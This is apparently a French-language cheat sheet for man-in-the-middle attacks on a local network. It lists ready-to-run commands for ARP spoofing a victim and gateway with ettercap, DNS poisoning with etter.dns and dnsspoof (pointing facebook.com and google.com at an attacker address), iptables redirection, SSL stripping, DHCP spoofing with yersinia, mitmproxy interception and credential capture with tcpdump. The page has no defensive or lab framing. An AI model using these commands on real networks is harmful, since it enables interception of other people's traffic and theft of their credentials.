## Attaque ARP Spoofing pour intercepter le trafic

```bash
ettercap -Tq -i eth0 -M arp:remote /IP_VICTIME/ /IP_PASSERELLE/
```

## Empoisonnement DNS avec Ettercap

```bash
cat /etc/ettercap/etter.dns
# domaine_victime A adresse_attaquant
```

Lancer Ettercap :
- Ajouter l'IP cible
- Activer `dns_spoof`

## Démarrer un faux serveur DNS avec dnsspoof

```bash
dnsspoof -i eth0 -f dns_hosts
```
Créer un fichier `dns_hosts` :
```bash
192.168.1.100 facebook.com
192.168.1.100 google.com
```

## Redirection du trafic avec iptables

```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## SSL Stripping pour capturer les requêtes HTTPS

```bash
sslstrip -l 8080
```

## DHCP Spoofing pour devenir le gateway

```bash
yersinia dhcp -attack 1
```

## Proxy MITM avec mitmproxy

```bash
mitmproxy -T --host
```

Analyser le trafic avec l'interface web de mitmproxy :

```bash
mitmweb
```

## Capture des identifiants avec Wireshark ou tcpdump

```bash
tcpdump -i eth0 port 80
```